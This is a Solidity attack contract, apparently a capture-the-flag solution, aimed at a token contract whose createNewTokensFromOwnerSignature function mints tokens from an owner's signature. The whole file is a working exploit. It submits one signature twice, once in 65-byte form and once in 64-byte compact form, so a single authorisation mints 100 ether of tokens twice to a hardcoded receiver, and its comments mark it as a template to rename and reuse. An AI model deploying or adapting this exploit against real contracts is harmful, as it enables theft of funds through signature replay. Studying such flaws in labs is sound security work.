// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IForger { // 1) change interface name

    function createNewTokensFromOwnerSignature(
        bytes calldata signature,
        address receiver,
        uint256 amount,
        bytes32 salt,           
        uint256 deadline      
    ) external;
}

contract ForgerAttack { // 2) change nameattck

    address constant receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
    uint256 constant amount = 100 ether;
    bytes32 constant salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
    uint256 constant deadline = type(uint256).max;

    bytes constant sig65 = hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c";
    bytes constant sig64 = hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809c02f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb";

    IForger target;

    constructor(address _target) {
        target = IForger(_target);
    }
    function attack() external {

        target.createNewTokensFromOwnerSignature(sig65, receiver, amount, salt, deadline);
        target.createNewTokensFromOwnerSignature(sig64, receiver, amount, salt, deadline);
    }
}